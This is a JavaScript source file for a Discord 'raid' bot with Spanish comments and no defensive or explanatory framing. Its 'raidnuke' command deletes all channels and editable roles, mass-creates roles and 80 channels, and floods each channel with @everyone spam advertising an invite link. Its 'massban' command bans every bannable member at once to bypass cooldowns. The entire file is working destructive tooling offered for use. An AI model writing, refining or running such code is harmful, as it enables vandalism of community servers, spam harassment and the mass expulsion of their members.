const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Mensaje de spam extremo con el enlace definitivo
const SPAM_TEXT = "@everyone RAID BY MONTANA ON TOP\nJOIN DISCORD MONTANA ON TOP\nhttps://discord.gg/pMya4QTDKz";

client.once('ready', async () => {
    console.log(`Núcleo extremo activo como ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('raidnuke')
            .setDescription('Destruye canales, crea 80 con nombres de miedo, spamea y destruye/crea roles')
            .setDefaultMemberPermissions(0x8),
        new SlashCommandBuilder()
            .setName('massban')
            .setDescription('Baneo masivo brutal e instantáneo sin cooldown')
            .setDefaultMemberPermissions(0x8)
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
        console.log('Comandos brutales registrados correctamente.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName, guild } = interaction;

    if (commandName === 'raidnuke') {
        await interaction.reply({ content: '💀 EJECUTANDO PROTOCOLO NUCLEAR Y CREACIÓN DE ROLES...', ephemeral: true });

        // 1. Borrar todos los canales en paralelo de forma instantánea
        const channels = await guild.channels.fetch();
        await Promise.allSettled(channels.map(channel => channel.delete().catch(() => {})));

        // 2. Borrar todos los roles posibles (excepto @everyone y los inalcanzables)
        const roles = await guild.roles.fetch();
        await Promise.allSettled(roles.map(role => {
            if (role.editable && role.name !== '@everyone') {
                return role.delete().catch(() => {});
            }
        }));

        // 3. Crear más de 80 roles masivos llamados "Montana Hub : https://discord.gg/pMya4QTDKz" en paralelo
        const rolePromises = [];
        for (let i = 1; i <= 90; i++) {
            rolePromises.push(
                guild.roles.create({
                    name: `Montana Hub : https://discord.gg/pMya4QTDKz`,
                    color: 'Random',
                    reason: 'Montana Raid System'
                }).catch(() => {})
            );
        }
        await Promise.allSettled(rolePromises);

        // 4. Crear 80 canales con fuentes de terror / estilo extremo y spamear 80 veces al instante
        const scaryChannelNames = [
            "💀ʀᴀɪᴅ-ʙʏ-ᴍᴏɴᴛᴀɴᴀ💀",
            "⚰️ᴍᴏɴᴛᴀɴᴀ-ᴏɴ-ᴛᴏᴘ⚰️",
            "🩸ᴅᴇsᴛʀᴜᴄᴄɪᴏɴ-ᴛᴏᴛᴀʟ🩸",
            "🕳️sɪɴ-ᴇsᴄᴀᴘᴇ🕳️"
        ];

        for (let i = 1; i <= 80; i++) {
            try {
                const baseName = scaryChannelNames[(i - 1) % scaryChannelNames.length];
                const newChannel = await guild.channels.create({
                    name: `${baseName}-${i}`,
                    type: 0
                });

                // Lanzar los 80 mensajes de spam en paralelo para que caigan de golpe
                const spamPromises = [];
                for (let j = 0; j < 80; j++) {
                    spamPromises.push(newChannel.send(SPAM_TEXT).catch(() => {}));
                }
                await Promise.allSettled(spamPromises);
            } catch (err) {
                console.log('Error en canal:', err);
            }
        }
    }

    if (commandName === 'massban') {
        await interaction.reply({ content: '⚡ BANEANDO A TODOS LOS USUARIOS AL INSTANTE...', ephemeral: true });
        try {
            const members = await guild.members.fetch();
            // Baneo masivo brutal usando Promise.allSettled para eliminar tiempos de espera (sin cooldown)
            await Promise.allSettled(
                members.map(member => {
                    if (member.bannable && member.id !== interaction.client.user.id) {
                        return member.ban({ reason: 'Montana Hub Brutal Raid' }).catch(() => {});
                    }
                })
            );
        } catch (err) {
            console.log('Error en baneo masivo:', err);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
